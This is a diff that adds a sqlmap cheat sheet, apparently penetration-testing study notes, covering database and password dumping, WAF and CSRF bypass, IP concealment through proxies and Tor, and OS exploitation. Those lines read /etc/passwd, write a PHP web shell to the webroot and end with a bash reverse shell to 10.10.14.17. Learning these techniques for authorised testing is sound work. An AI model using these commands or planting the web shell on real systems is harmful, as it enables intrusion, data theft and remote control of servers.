@@ -1,0 +1,142 @@
+---
+title: sqlmap
+---
+
+# sqlmap
+- resources
+    - [hacktricks sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
+- install
+    - `sudo apt install sqlmap`
+- usage
+    - advanced help `sqlmap -hh`
+    - use default behaviour `--batch`
+        - `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`
+    - common responses
+        - URL content is stable `target URL content is stable` means that there are no major changes between responses in case of continuous identical requests
+        - Parameter appears to be dynamic `GET parameter 'id' appears to be dynamic`  it is a sign that any changes made to its value would result in a change in the response
+        - Parameter might be injectable `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')`  just an indication that the detection mechanism has to be proven in the subsequent run
+        - Parameter might be vulnerable to XSS attacks `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks` quick heuristic test for the presence of an XSS vulnerability
+        - Back-end DBMS is '...' `it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]`  running all SQL injection payloads for that specific DBMS
+        - Level/risk values `for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]` 
+        - Reflective values found `reflective value(s) found and filtering out` a warning that parts of the used payloads are found in the response
+        - Parameter appears to be injectable `GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")`  indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding
+        - Time-based comparison statistical model `time-based comparison requires a larger statistical model, please wait........... (done)` SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times
+        - Extending UNION query injection technique tests `automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found` good chance that the target is vulnerable. UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. 
+        - Technique appears to be usable `ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test` Technique appears to be usable
+        - Parameter is vulnerable `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]` the parameter was found to be vulnerable to SQL injections
+        - Sqlmap identified injection points `sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:` represents the final proof of successful detection and exploitation of found SQLi vulnerabilities
+        - Data logged to text files `fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'`  indicates the local file system location used for storing all logs, sessions, and output data for a specific target 
+    - **curl to sqlmap**
+        - from browser copy request as cUrl, paste to term and replace curl with sqlmap
+            - `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`
+    - usage
+        - all params tested `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
+        - targeted params with * `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`
+        - use r flag to specify saved request from burp/wireshark `sqlmap -r req.txt`
+        - pass session cookie
+            - `--cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
+            - `-H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
+        - use random agent `--random-agent`
+            - imitate smart phone `--mobile`
+        - if you want to test cookies, mark with *
+            - `--cookie="id=1*"`
+        - dump the tables `--dump`
+        - display errors `--parse-errors`
+        - save all requests and responses `-t /tmp/traffic.txt`
+        - proxy `--proxy=http://127.0.0.1:8080`
+        - `--level` (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level)
+        - `--risk` (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service)
+        - verbosity `-v 3`
+        - filter results by 
+            - response code `--code=200`
+            - page title `--titles`
+            - strings `--string=success`
+        - only return txt `--text-only`
+        - techniques to use `--technique=BEU`
+        - prefix/suffix 
+            - imagine a query like this `$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";`
+            - prefix needs to close off the brackets, payload is inserted, suffix adds the comment string
+                - `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`
+                - sometimes uses backtick and not single quote
+                    - `Use the prefix '``)'.`       # its dbl escaped here
+        - database enumeration
+            - `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`
+        - table enumeration
+            - `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`
+        - dump table
+            - `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`
+        - dump particular columns
+            - `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`
+        - limit results
+            - `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`
+        - conditional enumeration
+            - `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`
+        - get schema
+            - `sqlmap -u "http://www.example.com/?id=1" --schema`
+        - searching
+            - tables like user `sqlmap -u "http://www.example.com/?id=1" --search -T user`
+            - columns like pass `sqlmap -u "http://www.example.com/?id=1" --search -C pass`
+        - password enumeration and cracking
+            - can automatically detect
+            - get system users and passwords `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`
+        - bypass
+            - anti-CRSF token
+                - `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`
+                - `sqlmap -r 8.req --dump --csrf-token="t0ken"`     body is added after request headers
+            - unique value bypass (rp is randomized for every request)
+                - `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`
+                - `sqlmap -r 9.req --dump --randomize=uid`
+            - Calculated Parameter Bypass (is where a web application expects a proper parameter value to be calculated based on some other parameter value(s))
+                - `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`
+            - user agent blacklisting `--random-agent`
+                - `sqlmap -r 10.req --dump --random-agent`
+            - ip address concealing
+                - `sqlmap -u "http://www.example.com/?id=1" --proxy="socks4://177.39.187.70:33283"`
+                - use list `--proxy-file`
+            - tor
+                - requires SOCKS4 proxy service at the local port 9050 or 9150
+                - will use above prots `--tor`
+                - confirm tor `--check-tor`
+            - skip waf checking `--skip-waf`
+            - chunked transfer (sql keywords are split up) `--chunked`
+        - tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection
+            - chaining multiple `sqlmap -u "http://www.example.com/?id=1" --tamper=between,randomcase`
+            - list all `sqlmap --list-tampers`
+            - `sqlmap -r 11.req --dump --tamper=between -T flag11`
+            - `sqlmap -r 11.req --dump --tamper=charencode`
+            - `sqlmap 'http://83.136.254.37:59867/action.php' -X POST -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.254.37:59867/shop.html' -H 'Content-Type: application/json' -H 'Origin: http://83.136.254.37:59867' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Sec-GPC: 1' --data-raw '{"id":1}' --parse-errors --random-agent --tamper=between --level 5 --risk 3 --technique=t --dump`
+            - try this order of tamper scripts
+                - `between`     used to replace ">" for xss prevention
+                - `0eunion` 	Replaces instances of UNION with e0UNION
+                - `base64encode` 	Base64-encodes all characters in a given payload
+                - `commalesslimit` 	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
+                - `equaltolike` 	Replaces all occurrences of operator equal (=) with LIKE counterpart
+                - `halfversionedmorekeywords` 	Adds (MySQL) versioned comment before each keyword
+                - `modsecurityversioned` 	Embraces complete query with (MySQL) versioned comment
+                - `modsecurityzeroversioned` 	Embraces complete query with (MySQL) zero-versioned comment
+                - `percentage` 	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
+                - `plus2concat` 	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
+                - `randomcase` 	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
+                - `space2comment` 	Replaces space character ( ) with comments `/
+                - `space2dash` 	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
+                - `space2hash` 	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
+                - `space2mssqlblank` 	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
+                - `space2plus` 	Replaces space character ( ) with plus (+)
+                - `space2randomblank` 	Replaces space character ( ) with a random blank character from a valid set of alternate characters
+                - `symboliclogical` 	Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+                - `versionedkeywords` 	Encloses each non-function keyword with (MySQL) versioned comment
+                - `versionedmorekeywords` 	Encloses each keyword with (MySQL) versioned comment
+        - OS exploitation
+            - check permissions first `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`
+            - read file `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`
+            - writing file
+                - simple web shell `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+                - `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
+                - execute `curl http://www.example.com/shell.php?cmd=ls+-la`
+            - os shell
+                - `sqlmap -u "http://www.example.com/?id=1" --os-shell`
+            - 
+- standard scan with authentication session id `sqlmap http://$ip/dashboard.php?search=1 --cookie='PHPSESSID=e4fiooi46kheu3ce7kntl9g50l' -p search`
+- get --os-shell `sqlmap http://$ip/dashboard.php?search=1 --cookie='PHPSESSID=e4fiooi46kheu3ce7kntl9g50l' -p search --os-shell`
+    - get stable shell `bash -c "bash -i >& /dev/tcp/10.10.14.17/443 0>&1"`
+ 
